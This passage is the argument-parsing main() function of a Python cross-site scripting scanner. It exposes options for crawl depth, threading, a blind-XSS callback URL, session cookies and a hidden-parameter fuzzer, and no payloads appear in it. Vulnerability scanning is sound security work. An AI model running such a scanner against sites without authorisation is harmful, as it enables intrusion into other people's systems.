# ──────────────────────────────────────────────
def main():
    parser = argparse.ArgumentParser(
        description="Advanced XSS Scanner — Reflected, Stored, DOM, Blind",
        formatter_class=argparse.RawTextHelpFormatter
    )
    parser.add_argument("url",              help="Target URL (e.g. http://example.com)")
    parser.add_argument("-d","--depth",     type=int, default=DEFAULT_DEPTH,  help="Crawl depth (default: 3)")
    parser.add_argument("-t","--threads",   type=int, default=DEFAULT_THREADS,help="Concurrent threads (default: 10)")
    parser.add_argument("--timeout",        type=int, default=DEFAULT_TIMEOUT, help="Request timeout (default: 10)")
    parser.add_argument("--delay",          type=float,default=DEFAULT_DELAY, help="Delay between requests (default: 0.2)")
    parser.add_argument("--callback",       default="", help="Blind XSS callback URL")
    parser.add_argument("--cookies",        default="", help="Cookies string: 'name=val; name2=val2'")
    parser.add_argument("--header",         action="append", default=[],
                        help="Extra header: 'Name: Value' (repeatable)")
    parser.add_argument("-o","--output",    default="reports", help="Output directory (default: reports)")
    parser.add_argument("--fuzz",           action="store_true", help="Enable param wordlist fuzzer to find hidden parameters")
    parser.add_argument("--wordlist",       default="", help="Path to custom param wordlist file (one param per line)")
    args = parser.parse_args()

    extra_headers = {}
    for h in args.header:
        if ":" in h:
            k, v = h.split(":", 1)
            extra_headers[k.strip()] = v.strip()

    # Load custom wordlist if provided
    custom_wl = None
    if args.wordlist and os.path.isfile(args.wordlist):
        with open(args.wordlist) as wf:
            custom_wl = [line.strip() for line in wf if line.strip()]
        print(f"[*] Loaded {len(custom_wl)} params from wordlist: {args.wordlist}")

    scanner = AdvancedXSSScanner(
        target=args.url,
        depth=args.depth,
        threads=args.threads,
        timeout=args.timeout,
        delay=args.delay,
        callback_url=args.callback,
        cookies=args.cookies,
        headers_extra=extra_headers,
        output_dir=args.output,
        fuzz_params=args.fuzz,
        custom_wordlist=custom_wl,
    )
    scanner.run()

if __name__ == "__main__":
    main()
